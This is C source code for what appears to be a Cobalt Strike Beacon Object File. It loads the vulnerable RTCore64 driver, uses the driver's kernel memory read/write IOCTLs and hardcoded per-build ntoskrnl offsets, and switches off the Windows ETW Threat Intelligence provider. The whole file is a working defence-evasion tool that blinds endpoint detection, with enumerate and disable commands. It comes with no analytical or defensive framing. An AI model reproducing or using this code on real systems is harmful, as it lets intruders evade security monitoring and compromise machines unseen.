/*
 * Uso:
 *   etw_enum    {F4E1897C-BB5D-5668-F1D8-040F4D8DD344}
 *   etw_disable {F4E1897C-BB5D-5668-F1D8-040F4D8DD344}
 */

#include <windows.h>
#include "beacon.h"

#define RTCORE64_MEMORY_READ_IOCTL  0x80002048
#define RTCORE64_MEMORY_WRITE_IOCTL 0x8000204c
#define RTCORE64_DEVICE_NAME        "\\\\.\\RTCore64"

typedef struct {
    BYTE    Pad0[8];
    DWORD64 Address;
    BYTE    Pad1[8];
    DWORD   ReadSize;
    DWORD   Value;
    BYTE    Pad3[16];
} RTCORE64_MEMORY;

DECLSPEC_IMPORT HANDLE  WINAPI KERNEL32$CreateFileA(LPCSTR, DWORD, DWORD,
                            LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
DECLSPEC_IMPORT BOOL    WINAPI KERNEL32$DeviceIoControl(HANDLE, DWORD, LPVOID, DWORD,
                            LPVOID, DWORD, LPDWORD, LPOVERLAPPED);
DECLSPEC_IMPORT BOOL    WINAPI KERNEL32$CloseHandle(HANDLE);
DECLSPEC_IMPORT DWORD   WINAPI KERNEL32$GetLastError(void);
DECLSPEC_IMPORT LPVOID  WINAPI KERNEL32$VirtualAlloc(LPVOID, SIZE_T, DWORD, DWORD);
DECLSPEC_IMPORT BOOL    WINAPI KERNEL32$VirtualFree(LPVOID, SIZE_T, DWORD);

DECLSPEC_IMPORT NTSTATUS WINAPI NTDLL$NtQuerySystemInformation(ULONG, PVOID, ULONG, PULONG);

DECLSPEC_IMPORT BOOL    WINAPI PSAPI$EnumDeviceDrivers(LPVOID*, DWORD, LPDWORD);
DECLSPEC_IMPORT DWORD   WINAPI PSAPI$GetDeviceDriverBaseNameA(LPVOID, LPSTR, DWORD);

DECLSPEC_IMPORT DWORD   WINAPI VERSION$GetFileVersionInfoSizeA(LPCSTR, LPDWORD);
DECLSPEC_IMPORT BOOL    WINAPI VERSION$GetFileVersionInfoA(LPCSTR, DWORD, DWORD, LPVOID);
DECLSPEC_IMPORT BOOL    WINAPI VERSION$VerQueryValueA(LPCVOID, LPCSTR, LPVOID*, PUINT);

#define ETW_REG_ENTRY_GUIDENTRY_OFF  0x20   /* ETW_REG_ENTRY.GuidEntry   */
#define ETW_GUID_ENTRY_PEI_OFF       0x60   /* ETW_GUID_ENTRY.ProviderEnableInfo */

typedef struct {
    DWORD   build;
    DWORD   revision;
    DWORD64 EtwThreatIntProvRegHandle;  /* RVA from ntoskrnl base */
} ETW_OFFSETS;

static const ETW_OFFSETS g_etw_offsets[] = {
     /* agregar offset en esta seccion :) */
    /*
     * Build 26100.7920 — Windows 11 24H2
     * SHA256 : 26cc8c3eb2a12e3309092ecda22e59178ee3c8ced4b0db67dd5ec508ca7aba46
     * PDB    : ntkrnlmp.pdb / 00000006EA6E2C8ACAFD0D39905597EE4250318165
     */
    { 26100, 7920, 0x00EFED80 },

    /*
     * Build 26100.7824 — Windows 11 24H2
     * SHA256 : 54f57116bcbbe96da72088130a8f949e13884a3db39d81f4b80cb26a88de00ac
     * PDB    : ntkrnlmp.pdb / 0000000614A4A1C4BC88E96D308B5D3D164723061
     */
    { 26100, 7824, 0x00EFEC80 },

    /*
     * Build 22621.6630 — Windows 11 22H2
     * SHA256 : f1e5edf5175327d22c10eb2248456070b46b78db5dfdbc665d3b30fd570eefee
     * PDB    : ntkrnlmp.pdb / 0000000592612D4E4B981AADC80FD80C3446489146
     */
    { 22621, 6630, 0x00C31D08 },

    /*
     * Build 20348.587 — Windows Server 2022
     * SHA256 : 5669b9b8bfcf20f08b7d1d65dc2deccbf836279c0e3f66722d72ad33ee7f672a
     * PDB    : ntkrnlmp.pdb / 00000005A9AFD801FBC06177380800F73929891592
     */
    { 20348,  587, 0x00C21AD8 },

    /*
     * Build 19041.6456 — Windows 10 22H2
     * SHA256 : 563f486f45853248e54b3ee800d6b19289101c6cca15e0e3fa11a70452b5ce91
     * PDB    : ntkrnlmp.pdb / 00000005740BF57E8E085650E8AF07723948662001
     */
    { 19041, 6456, 0x00C19998 },

    { 0 }
};

static DWORD64 rtcore_read64(HANDLE hDrv, DWORD64 addr)
{
    RTCORE64_MEMORY mem = {0};
    DWORD ret = 0;

    mem.Address  = addr;
    mem.ReadSize = 4;
    KERNEL32$DeviceIoControl(hDrv, RTCORE64_MEMORY_READ_IOCTL,
                             &mem, sizeof(mem), &mem, sizeof(mem), &ret, NULL);
    DWORD64 lo = mem.Value;

    mem.Address  = addr + 4;
    mem.ReadSize = 4;
    mem.Value    = 0;
    KERNEL32$DeviceIoControl(hDrv, RTCORE64_MEMORY_READ_IOCTL,
                             &mem, sizeof(mem), &mem, sizeof(mem), &ret, NULL);
    DWORD64 hi = mem.Value;

    return lo | (hi << 32);
}

static DWORD rtcore_read8(HANDLE hDrv, DWORD64 addr)
{
    RTCORE64_MEMORY mem = {0};
    DWORD ret = 0;
    mem.Address  = addr;
    mem.ReadSize = 1;
    KERNEL32$DeviceIoControl(hDrv, RTCORE64_MEMORY_READ_IOCTL,
                             &mem, sizeof(mem), &mem, sizeof(mem), &ret, NULL);
    return mem.Value & 0xFF;
}

static void rtcore_write8(HANDLE hDrv, DWORD64 addr, BYTE value)
{
    RTCORE64_MEMORY mem = {0};
    DWORD ret = 0;
    mem.Address  = addr;
    mem.ReadSize = 1;
    mem.Value    = value;
    KERNEL32$DeviceIoControl(hDrv, RTCORE64_MEMORY_WRITE_IOCTL,
                             &mem, sizeof(mem), &mem, sizeof(mem), &ret, NULL);
}

static void get_ntoskrnl_version(DWORD* build, DWORD* revision)
{
    DWORD handle = 0;
    DWORD size = VERSION$GetFileVersionInfoSizeA(
        "C:\\Windows\\System32\\ntoskrnl.exe", &handle);

    *build = *revision = 0;
    if (!size) return;

    char* buf = KERNEL32$VirtualAlloc(NULL, size,
                    MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!buf) return;

    if (VERSION$GetFileVersionInfoA("C:\\Windows\\System32\\ntoskrnl.exe",
                                     handle, size, buf)) {
        void*  ptr = NULL;
        UINT   len = 0;
        if (VERSION$VerQueryValueA(buf, "\\", &ptr, &len) && len >= 52) {
            DWORD ls = *(DWORD*)((char*)ptr + 12);
            *build    = (ls >> 16) & 0xFFFF;
            *revision = (ls >>  0) & 0xFFFF;
        }
    }
    KERNEL32$VirtualFree(buf, 0, MEM_RELEASE);
}

static const ETW_OFFSETS* find_etw_offsets(DWORD build, DWORD revision)
{

    for (int i = 0; g_etw_offsets[i].build != 0; i++) {
        if (g_etw_offsets[i].build    == build &&
            g_etw_offsets[i].revision == revision)
            return &g_etw_offsets[i];
    }

    const ETW_OFFSETS* fallback = NULL;
    for (int i = 0; g_etw_offsets[i].build != 0; i++) {
        if (g_etw_offsets[i].build == build)
            fallback = &g_etw_offsets[i];
    }
    return fallback;
}

#define SystemModuleInformation 11
#define MOD_BUF_SIZE (1024 * 1024)

typedef struct {
    HANDLE Section;
    PVOID  MappedBase;
    PVOID  ImageBase;
    ULONG  ImageSize;
    ULONG  Flags;
    USHORT LoadOrderIndex;
    USHORT InitOrderIndex;
    USHORT LoadCount;
    USHORT ModuleNameOffset;
    CHAR   FullPathName[256];
} SYSTEM_MODULE;

typedef struct {
    ULONG         ModulesCount;
    SYSTEM_MODULE Modules[1];
} SYSTEM_MODULE_INFORMATION;

#define MAX_DRIVERS 512

static DWORD64 get_kernel_base(void)
{
    ULONG needed = 0;
    NTDLL$NtQuerySystemInformation(SystemModuleInformation, NULL, 0, &needed);
    if (needed) {
        SYSTEM_MODULE_INFORMATION* info = KERNEL32$VirtualAlloc(
            NULL, needed + 4096, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (info) {
            NTSTATUS st = NTDLL$NtQuerySystemInformation(
                SystemModuleInformation, info, needed + 4096, &needed);
            if (st == 0 && info->ModulesCount > 0) {
                for (ULONG i = 0; i < info->ModulesCount; i++) {
                    if ((DWORD64)info->Modules[i].ImageBase == 0) continue;
                    const char* name = info->Modules[i].FullPathName +
                                       info->Modules[i].ModuleNameOffset;
                    if ((name[0]=='n'||name[0]=='N') &&
                        (name[1]=='t'||name[1]=='T') &&
                        ((name[2]=='o'||name[2]=='O') ||
                         (name[2]=='k'||name[2]=='K'))) {
                        DWORD64 base = (DWORD64)info->Modules[i].ImageBase;
                        KERNEL32$VirtualFree(info, 0, MEM_RELEASE);
                        return base;
                    }
                }
            }
            KERNEL32$VirtualFree(info, 0, MEM_RELEASE);
        }
    }

    static LPVOID drivers[MAX_DRIVERS];
    DWORD drv_needed = 0;
    if (PSAPI$EnumDeviceDrivers(drivers, sizeof(drivers), &drv_needed)) {
        char name[64];
        DWORD count = drv_needed / sizeof(LPVOID);
        for (DWORD i = 0; i < count; i++) {
            name[0] = '\0';
            PSAPI$GetDeviceDriverBaseNameA(drivers[i], name, sizeof(name));
            if ((name[0]=='n'||name[0]=='N') &&
                (name[1]=='t'||name[1]=='T') &&
                ((name[2]=='o'||name[2]=='O') ||
                 (name[2]=='k'||name[2]=='K')))
                return (DWORD64)drivers[i];
        }
    }

    return 0;
}

static DWORD64 resolve_pei(HANDLE hDrv, DWORD64 kbase, const ETW_OFFSETS* off)
{
    DWORD64 va_handle  = kbase + off->EtwThreatIntProvRegHandle;
    DWORD64 reg_entry  = rtcore_read64(hDrv, va_handle);

    if (!reg_entry) {
        BeaconPrintf(CALLBACK_OUTPUT,
            "[-] EtwThreatIntProvRegHandle is NULL — ETW-TI may not be active\r\n");
        return 0;
    }

    DWORD64 guid_entry = rtcore_read64(hDrv, reg_entry + ETW_REG_ENTRY_GUIDENTRY_OFF);
    if (!guid_entry) {
        BeaconPrintf(CALLBACK_OUTPUT,
            "[-] ETW_GUID_ENTRY pointer is NULL\r\n");
        return 0;
    }

    return guid_entry + ETW_GUID_ENTRY_PEI_OFF;
}

void go_enum(char* args, int len)
{
    datap parser;
    BeaconDataParse(&parser, args, len);
    wchar_t* guid_w = (wchar_t*)BeaconDataExtract(&parser, NULL);

    char guid_display[64] = {0};
    if (guid_w) {
        int i = 0;
        while (i < 63 && guid_w[i]) {
            guid_display[i] = (char)(guid_w[i] & 0x7F);
            i++;
        }
        guid_display[i] = '\0';
    } else {
        guid_display[0] = '?'; guid_display[1] = '\0';
    }


    DWORD build, revision;
    get_ntoskrnl_version(&build, &revision);
    BeaconPrintf(CALLBACK_OUTPUT,
        "[*] ntoskrnl version: 10.0.%lu.%lu\r\n", build, revision);

    const ETW_OFFSETS* off = find_etw_offsets(build, revision);
    if (!off) {
        BeaconPrintf(CALLBACK_OUTPUT,
            "[-] No ETW offsets for build %lu.%lu — run extract_offsets.py\r\n",
            build, revision);
        return;
    }

    DWORD64 kbase = get_kernel_base();
    if (!kbase) {
        BeaconPrintf(CALLBACK_OUTPUT,
            "[-] Failed to locate ntoskrnl base\r\n");
        return;
    }

    HANDLE hDrv = KERNEL32$CreateFileA(RTCORE64_DEVICE_NAME,
                      GENERIC_READ | GENERIC_WRITE, 0, NULL,
                      OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hDrv == INVALID_HANDLE_VALUE) {
        BeaconPrintf(CALLBACK_OUTPUT,
            "[-] Failed to open RTCore64 (error %lu)\r\n",
            KERNEL32$GetLastError());
        return;
    }

    DWORD64 pei = resolve_pei(hDrv, kbase, off);
    if (!pei) {
        KERNEL32$CloseHandle(hDrv);
        return;
    }

    DWORD is_enabled = rtcore_read8(hDrv, pei);

    BeaconPrintf(CALLBACK_OUTPUT,
        "\r\nProvider  : %s\r\n"
        "ProviderEnableInfo.IsEnabled == %lu\r\n",
        guid_display, is_enabled);

    KERNEL32$CloseHandle(hDrv);
}

void go_disable(char* args, int len)
{
    datap parser;
    BeaconDataParse(&parser, args, len);
    wchar_t* guid_w = (wchar_t*)BeaconDataExtract(&parser, NULL);

    char guid_display[64] = {0};
    if (guid_w) {
        int i = 0;
        while (i < 63 && guid_w[i]) {
            guid_display[i] = (char)(guid_w[i] & 0x7F);
            i++;
        }
        guid_display[i] = '\0';
    } else {
        guid_display[0] = '?'; guid_display[1] = '\0';
    }

    DWORD build, revision;
    get_ntoskrnl_version(&build, &revision);
    BeaconPrintf(CALLBACK_OUTPUT,
        "[*] ntoskrnl version: 10.0.%lu.%lu\r\n", build, revision);

    const ETW_OFFSETS* off = find_etw_offsets(build, revision);
    if (!off) {
        BeaconPrintf(CALLBACK_OUTPUT,
            "[-] No ETW offsets for build %lu.%lu — run extract_offsets.py\r\n",
            build, revision);
        return;
    }

    DWORD64 kbase = get_kernel_base();
    if (!kbase) {
        BeaconPrintf(CALLBACK_OUTPUT,
            "[-] Failed to locate ntoskrnl base\r\n");
        return;
    }

    /* Open RTCore64 */
    HANDLE hDrv = KERNEL32$CreateFileA(RTCORE64_DEVICE_NAME,
                      GENERIC_READ | GENERIC_WRITE, 0, NULL,
                      OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hDrv == INVALID_HANDLE_VALUE) {
        BeaconPrintf(CALLBACK_OUTPUT,
            "[-] Failed to open RTCore64 (error %lu)\r\n",
            KERNEL32$GetLastError());
        return;
    }

    DWORD64 pei = resolve_pei(hDrv, kbase, off);
    if (!pei) {
        KERNEL32$CloseHandle(hDrv);
        return;
    }

    DWORD before = rtcore_read8(hDrv, pei);
    BeaconPrintf(CALLBACK_OUTPUT,
        "[*] Provider  : %s\r\n"
        "[*] IsEnabled before: %lu\r\n",
        guid_display, before);

    if (!before) {
        BeaconPrintf(CALLBACK_OUTPUT,
            "[*] Already disabled — nothing to do\r\n");
        KERNEL32$CloseHandle(hDrv);
        return;
    }


    rtcore_write8(hDrv, pei, 0);

    DWORD after = rtcore_read8(hDrv, pei);
    if (!after) {
        BeaconPrintf(CALLBACK_OUTPUT,
            "[+] IsEnabled after : %lu -- ETW-TI disabled\r\n", after);
    } else {
        BeaconPrintf(CALLBACK_OUTPUT,
            "[-] IsEnabled after : %lu — write may have failed\r\n", after);
    }

    KERNEL32$CloseHandle(hDrv);
}
